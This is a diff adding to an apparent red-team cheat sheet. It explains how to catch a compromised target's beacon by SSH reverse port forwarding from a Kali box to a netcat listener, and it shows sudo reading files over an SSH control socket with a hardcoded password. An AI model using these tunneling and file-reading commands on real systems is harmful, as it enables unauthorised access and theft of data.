@@ -8,3 +8,67 @@ ssh -S /tmp/T# \| sudo --prompt="" -S -- cat <file> > <dir coppied to or name of
 ssh -S /tmp/T# \| sudo --prompt="" -S -- cat <file> > <where you want file /name> << EOF
 > password11
 > EOF
+
+
+============================================================================================
+============================================================================================
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+____________________________________________________________________________________________
+
+
+remote tunneling explained by notorious gangster andrew rodgers
+
+EXAMPLE
+T4 target
+kalibox is obviously kali
+you see a beacon on a target machine, lets say T4 beaconing on port 12345
+
+kaliops# ssh -S /tmp/T4 -R <ipofT4>:12345:127.0.0.1:RHP1
+
+nc -nlvp RHP1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if you use wevutil in windows box you are in the application logs
+
+
+
+
+
+
+
+
